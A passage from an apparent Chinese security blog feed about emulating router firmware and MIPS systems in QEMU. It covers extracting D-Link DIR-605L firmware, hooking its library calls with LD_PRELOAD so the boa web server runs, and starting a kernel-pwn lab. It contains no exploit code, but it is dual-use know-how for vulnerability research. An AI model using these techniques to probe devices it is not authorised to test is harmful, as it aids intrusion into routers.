class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">cp</span> -r /usr/mipsel-linux-gnu/lib .</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) .</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ sudo <span class="built_in">chroot</span> . ./qemu-mipsel-static hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 在模拟时添加路径 【感觉最简单</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ qemu-mipsel -L <span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span> hellomips2 <span class="string">&quot;can run&quot;</span></span><br><span class="line">can run</span><br></pre></td></tr></table></figure>

<p><strong>神奇的未理解的现象</strong><br>在理论来说，不同架构的程序是不能运行的，但是在静态编译后却能够运行，有点费解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 尝试程序为 家用路由器漏洞 一书第二章 hello 和 静态交叉编译的 hellomips</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hello</span><br><span class="line">hello: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ file hellomips</span><br><span class="line">hellomips: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a0c1b5ffe47a77b693643e4637baa72d4496a962, not stripped</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ <span class="built_in">uname</span> -a </span><br><span class="line">Linux ubuntu 5.4.0-84-generic <span class="comment">#94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hello <span class="string">&quot;Why can run&quot;</span></span><br><span class="line">Why can run</span><br><span class="line">embeded@ubuntu:~/domesticRouter/2$ ./hellomips <span class="string">&quot;Why can run&quot;</span></span><br><span class="line">Why can run</span><br></pre></td></tr></table></figure>

<h1 id="软件环境配置流程"><a href="#软件环境配置流程" class="headerlink" title="软件环境配置流程"></a>软件环境配置流程</h1><h2 id="MIPS-系统网络配置"><a href="#MIPS-系统网络配置" class="headerlink" title="MIPS 系统网络配置"></a>MIPS 系统网络配置</h2><p><strong>安装工具库</strong></p>
<p>安装 User mode Linux 工具,User Mode Linux 能够以用户态启动 Linux 内核，提供了一种虚拟机，将 Linux 作为用户进程运行在另一个 Linux 内核下。 这对于内核开发、沙盒、监禁、实验和许多其他事情很有用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo apt install uml-utilities</span><br><span class="line">embeded@ubuntu:~$ uml_</span><br><span class="line">uml_mconsole  uml_moo       uml_switch    </span><br><span class="line">uml_mkcow     uml_mount     uml_watchdog</span><br></pre></td></tr></table></figure>
<p>安装 Linux 网桥工具,能够创建和管理网桥设备，可为VM设置网络</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo apt install bridge-utils</span><br></pre></td></tr></table></figure>
<p><strong>配置主机网络</strong><br>要构建模拟系统的网络配置，需要在主机网络配置网络接口，查看系统网络配置 可以看到两个网络接口为 ens33 和 lo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line">        inet6 fe80::ae68:bfd8:87e6:7a5e  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:0c:29:83:f8:e7  txqueuelen 1000  (Ethernet)</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>修改主机网络配置 将 ens33 作为桥接端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo nano /etc/network/interfaces</span><br><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33      </span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># auto br0</span></span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports ens33</span><br><span class="line">  bridge_maxwait 0</span><br></pre></td></tr></table></figure>

<!-- **修改 QEMU 网络接口脚本**
由于 ``qemu-ifup`` 文件早已存在，直接在脚本后面添加，能够支持 QEMU 在启动时处理网络
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo nano /etc/qemu-ifup</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Executing /etc/qemu-ifup&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Bridge up <span class="variable">$1</span> for bridged mode...&quot;</span></span><br><span class="line">sudo /sbin/ifconfig <span class="variable">$1</span> 0.0.0.0 promisc up</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Adding <span class="variable">$1</span> to br0...&quot;</span></span><br><span class="line">sudo /sbin/brct1 addif br0 <span class="variable">$1</span></span><br><span class="line"><span class="built_in">sleep</span> 2</span><br><span class="line">``` --&gt;</span><br><span class="line"></span><br><span class="line">**重启网络**</span><br><span class="line">为了使配置生效，需要将网络进行重启</span><br><span class="line">```bash</span><br><span class="line">embeded@ubuntu:~$ sudo /etc/init.d/networking restart</span><br><span class="line">[ ok ] Restarting networking (via systemctl): networking.service.</span><br></pre></td></tr></table></figure>

<p><strong>启用桥接网络</strong><br>先关闭 ens33 端口，查看网络接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo ifdown ens33</span><br><span class="line">...</span><br><span class="line">DHCPRELEASE on ens33 to 192.168.31.1 port 67 (xid=0x297aad1a)</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>开启 br0 桥接端口，重新查看网络接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~$ sudo ifup br0</span><br><span class="line">...</span><br><span class="line">DHCPDISCOVER on br0 to 255.255.255.255 port 67 interval 3 (xid=0x6dfa5573)</span><br><span class="line">DHCPREQUEST of 192.168.31.111 on br0 to 255.255.255.255 port 67 (xid=0x7355fa6d)</span><br><span class="line">DHCPOFFER of 192.168.31.111 from 192.168.31.1</span><br><span class="line">DHCPACK of 192.168.31.111 from 192.168.31.1</span><br><span class="line">bound to 192.168.31.111 -- renewal <span class="keyword">in</span> 16622 seconds.</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~$ ifconfig </span><br><span class="line">br0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line"></span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.31.111  netmask 255.255.255.0  broadcast 192.168.31.255</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br></pre></td></tr></table></figure>

<p><strong>修改MIPS系统网络</strong><br>以 MIPS 大端系统为例，虚拟机文件地址: <a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a> 选用 <code>vmlinux-2.6.32-5-4kc-malta</code> 内核文件及 <code>debian_squeeze_mips_standard.qcow2</code> 磁盘镜像</p>
<p>启动 MIPS 虚拟机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 账号密码均为 root</span></span><br><span class="line">debian-mips login: root</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看网络接口</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig -a</span></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改MIPS系统网络配置文件 <code>/etc/network/interfaces</code>, 将 <code>eh0</code> 替换成 <code>eh1</code>，并启动 <code>en1</code> 接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# nano /etc/network/interfaces</span><br><span class="line"># This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5).</span><br><span class="line"></span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line"># The primary network interface</span><br><span class="line">allow-hotplug eth1</span><br><span class="line">iface eth1 inet dhcp</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ifup eth1</span><br><span class="line">...</span><br><span class="line">bound to 192.168.31.170 -- renewal in 21254 seconds.</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ifconfig </span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01  </span><br><span class="line">          inet addr:192.168.31.170  Bcast:192.168.31.255  Mask:255.255.255.0</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ping 192.168.31.111</span><br><span class="line">PING 192.168.31.111 (192.168.31.111) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.31.111: icmp_req=1 ttl=64 time=6.43 ms</span><br><span class="line"></span><br><span class="line">root@debian-mips:~# ping www.baidu.com</span><br><span class="line">PING www.a.shifen.com (112.80.248.76) 56(84) bytes of data.</span><br><span class="line">64 bytes from 112.80.248.76: icmp_req=1 ttl=47 time=38.3 ms</span><br></pre></td></tr></table></figure>
<p>此时 MIPS 系统的网络算是配置完成，接下来就能够使用 ssh 对其进行管理</p>
]]></content>
      <categories>
        <category>Iot</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
      </tags>
  </entry>
  <entry>
    <title>修复路由器程序运行环境</title>
    <url>/2022/05/05/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="固件信息"><a href="#固件信息" class="headerlink" title="固件信息"></a>固件信息</h2><p>本章以 D-Link DIR-605L（FW_113）路由器为例</p>
<p>下载链接：	<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP">ftp://FTP2.DLINK.COM/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP</a></p>
<p>查看信息，解压并提取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3$ binwalk -e dir605L_FW_113.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">11280         0x2C10          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2129920 bytes</span><br><span class="line">563234        0x89822         Squashfs filesystem, big endian, version 2.0, size: 64160 bytes, 7 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:03:47</span><br><span class="line">628788        0x99834         Squashfs filesystem, big endian, version 2.0, size: 2301312 bytes, 495 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:04:00</span><br></pre></td></tr></table></figure>
<p>查看提取结果，可以看到系统信息存在于 <code>squashfs-root-0</code> 目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3$ tree -L 2 _dir605L_FW_113.bin.extracted/</span><br><span class="line">_dir605L_FW_113.bin.extracted/</span><br><span class="line">├── 2C10</span><br><span class="line">├── 2C10.7z</span><br><span class="line">├── 89822.squashfs</span><br><span class="line">├── 99834.squashfs</span><br><span class="line">├── squashfs-root</span><br><span class="line">│   ├── mydlink-watch-dog.sh</span><br><span class="line">│   ├── opt.local</span><br><span class="line">│   ├── signalc</span><br><span class="line">│   ├── tsa</span><br><span class="line">│   ├── uplog</span><br><span class="line">│   └── version</span><br><span class="line">└── squashfs-root-0</span><br><span class="line">    ├── bin</span><br><span class="line">    ├── dev</span><br><span class="line">    ├── etc</span><br><span class="line">    ├── lib</span><br><span class="line">    ├── mydlink</span><br><span class="line">    ├── proc</span><br><span class="line">    ├── sbin</span><br><span class="line">    ├── tmp -&gt; /dev/null</span><br><span class="line">    ├── usr</span><br><span class="line">    ├── var</span><br><span class="line">    ├── web</span><br><span class="line">    └── web-lang -&gt; /dev/null</span><br></pre></td></tr></table></figure>

<h2 id="尝试运行并修复-Web-服务器程序"><a href="#尝试运行并修复-Web-服务器程序" class="headerlink" title="尝试运行并修复 Web 服务器程序"></a>尝试运行并修复 Web 服务器程序</h2><p>使用 QEMU 进行模拟运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mips-static) .</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static ./bin/boa</span><br><span class="line">Initialize AP MIB failed!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>可以看到报错，信息为 <code>Initialize AP MIB failed</code>，在 <code>JEB</code> 打开 <code>boa</code> 进行字符串寻找<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051207608.png"><br>无论是根据反汇编进行查看，还是进行反编译查看，都能看到通过 <code>apmib_init</code> 进行初始化<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051225819.png"><br>使用 JEB 查看 <code>apmib.so</code> 中的 <code>apmib_init</code>，正常返回值应为 1<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051230467.png"></p>
<p>因此编写函数进行劫持</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">apmib_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Fake it</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译并再次运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so</span><br><span class="line"></span><br><span class="line">$ embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> ./bin/boa</span><br><span class="line">Create chklist file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<p>依旧报错，手上没有 IDA 尝试启用动态调试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> -g 1234 ./bin/boa</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205051527711.png"></p>
<p>这里结合 JEB 反汇编能看出来属于 apmib_get，但是其代码功能分析就暂时不做了，整理劫持函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_IP_ADDR 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_HW_VER 0x250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIB_CAPTCHA 0x2C1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">apmib_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Fake it;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">apmib_get</span><span class="params">(<span class="type">int</span> code, <span class="type">int</span> *value)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(code)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MIB_HW_VER:</span><br><span class="line">            *value = <span class="number">0xF1</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_IP_ADDR:</span><br><span class="line">            *value = <span class="number">0x7F000001</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_CAPTCHA:</span><br><span class="line">            *value = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行可以看到，成功运行 boa 程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ sudo <span class="built_in">chroot</span> . ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;/apmib-ld.so&quot;</span> ./bin/boa</span><br><span class="line">Create chklist file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">hard ver is</span><br><span class="line">Create f/w version file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">boa: server version Boa/0.94.14rc21</span><br><span class="line">boa: server built May 25 2012 at 13:03:21.</span><br><span class="line">boa: starting server pid=9326, port 80</span><br><span class="line">Unsupported ioctl: cmd=0x89f0</span><br><span class="line">device ioctl:: Function not implemented</span><br><span class="line">Unsupported ioctl: cmd=0x89f0</span><br><span class="line">device ioctl:: Function not implemented</span><br><span class="line">smart 404 ----------------------------------</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/domesticRouter/3/_dir605L_FW_113.bin.extracted/squashfs-root-0$ netstat -an | grep 80</span><br><span class="line">warning, got bogus unix line.</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     </span><br><span class="line">tcp        0      1 192.168.31.110:48678    34.122.121.32:80        SYN_SENT </span><br></pre></td></tr></table></figure>

<p>可以看到 Web 服务器 boa 已经成功运行</p>
]]></content>
      <categories>
        <category>Iot</category>
        <category>路由器</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>QEMU</tag>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Pwn 环境搭建及基础知识</title>
    <url>/2022/05/05/Kernel-Pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<span id="more"></span>
<p>本文主要参考 <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/">CTF-wiki</a> 和 <a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/">kiprey</a></p>
<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><strong>gdb 插件安装</strong><br>调试内核需要优秀的 gdb 插件，现有的插件有 <code>gef</code> <code>pwndbg</code> <code>peda</code>，有师傅推荐 gef，但是我们可以直接全部安装</p>
<p>脚本地址：<a href="https://github.com/apogiatzis/gdb-peda-pwndbg-gef">https://github.com/apogiatzis/gdb-peda-pwndbg-gef</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~ &amp;&amp; git <span class="built_in">clone</span> https://github.com/apogiatzis/gdb-peda-pwndbg-gef.git</span><br><span class="line"><span class="built_in">cd</span> ~/gdb-peda-pwndbg-gef</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
<p>这样就不用考虑以后使用其他插件的问题了</p>
<p><strong>内核配置</strong><br>官方的内核网址：<a href="https://www.kernel.org/category/releases.html">https://www.kernel.org/category/releases.html</a><br>一般选用 Longterm，即长期支持版</p>
<p>国内有很多镜像文件源，上海离中科大比较近，因此我们选用科大源 <a href="https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/">https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/</a></p>
<p>以 <code>linux-5.17.5.tar.xz</code> 为例，可以看到内核的全部文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ wget -c https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/v5.x/linux-5.17.5.tar.xz</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop$ unxz linux-5.17.5.tar.xz </span><br><span class="line">embeded@ubuntu:~/Desktop$ tar -xf linux-5.17.5.tar</span><br><span class="line">embeded@ubuntu:~/Desktop$ <span class="built_in">cd</span> linux-5.17.5/</span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">arch</span>     CREDITS        fs       Kbuild   LICENSES     net      security  virt</span><br><span class="line">block    crypto         include  Kconfig  MAINTAINERS  README   sound</span><br><span class="line">certs    Documentation  init     kernel   Makefile     samples  tools</span><br><span class="line">COPYING  drivers        ipc      lib      mm           scripts  usr</span><br></pre></td></tr></table></figure>

<p><strong>交换文件扩充（可选）</strong><br>由于选择在虚拟机上进行调试，在编译或者其他操作时可能会出现内存爆炸，这里我选择加一个交换空间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/embeded<span class="comment"># dd if=/dev/zero of=swapfile bs=1M count=5120</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># mkswap swapfile</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># chmod 0600 swapfile</span></span><br><span class="line">root@ubuntu:/home/embeded<span class="comment"># swapon swapfile</span></span><br></pre></td></tr></table></figure>

<p><strong>配置编译选项</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt install libncurses5-dev</span><br><span class="line">$ sudo apt install flex</span><br><span class="line">$ sudo apt install bison</span><br><span class="line">$ sudo apt install libssl-dev</span><br><span class="line">$ sudo apt install libelf-dev</span><br><span class="line">$ sudo apt install dwarves</span><br><span class="line"></span><br><span class="line">$ make menuconfig</span><br><span class="line"></span><br><span class="line">Kernel Hacking-&gt;Compile-checks and compiler options </span><br><span class="line">-&gt; Compile the kernel with debug info <span class="comment"># 便于调试，一般默认打开</span></span><br><span class="line">Generic Kernel Debugging Instruments</span><br><span class="line">-&gt; KGDB：kernel debugger <span class="comment"># KGDB 调试内核，一般默认打开</span></span><br></pre></td></tr></table></figure>

<p><strong>编译内核</strong><br>编辑内核镜像，建议不要选择太高，根据机器性能而定</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make -j 4 bzImage</span><br><span class="line">...</span><br><span class="line">  AS      <span class="built_in">arch</span>/x86/boot/header.o</span><br><span class="line">  LD      <span class="built_in">arch</span>/x86/boot/setup.elf</span><br><span class="line">  OBJCOPY <span class="built_in">arch</span>/x86/boot/setup.bin</span><br><span class="line">  BUILD   <span class="built_in">arch</span>/x86/boot/bzImage</span><br><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (<span class="comment">#2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bzImage: 主流 Kernel 镜像格式，适用于较大的 Kernel</span></span><br><span class="line">embeded@ubuntu:~/Desktop/linux-5.17.5$ binwalk ./arch/x86/boot/bzImage</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Microsoft executable, portable (PE)</span><br><span class="line">16588         0x40CC          gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null <span class="built_in">date</span>)</span><br><span class="line">7898753       0x788681        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>:warning: 报错信息 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make[1]: *** No rule to make target &#x27;debian/canonical-certs.pem&#x27;, needed by &#x27;certs/x509_certificate_list&#x27;.  Stop.</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br><span class="line"></span><br><span class="line">解决办法：直接修改 .config 文件，将 CONFIG_SYSTEM_TRUSTED_KEYS CONFIG_SYSTEM_REVOCATION_KEYS 置空</span><br></pre></td></tr></table></figure>

<p><strong>构建文件系统</strong><br>下载 busybox 源代码，并编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop$ wget -c https://busybox.net/downloads/busybox-1.35.0.tar.bz2</span><br><span class="line">embeded@ubuntu:~/Desktop$ tar -jxf busybox-1.35.0.tar.bz2</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop$ <span class="built_in">cd</span> busybox-1.35.0/</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make menuconfig</span><br><span class="line"></span><br><span class="line">Settings -&gt; Build static binary (no shared libs) <span class="comment"># kernel 不提供 libc</span></span><br><span class="line">关闭 Linux System Utilities -&gt; Support mounting NFS file systems on Linux &lt; 2.6.23 <span class="comment"># 一般默认不打开</span></span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make -j 4</span><br></pre></td></tr></table></figure>
<p>配置文件系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ make install</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ <span class="built_in">cd</span> _install</span><br><span class="line">embeded@ubuntu:~/Desktop/busybox-1.35.0$ <span class="built_in">mkdir</span> -p proc sys dev etc/init.d </span><br></pre></td></tr></table></figure>
<p>编写挂载脚本 init，设置权限并打包文件系统</p>
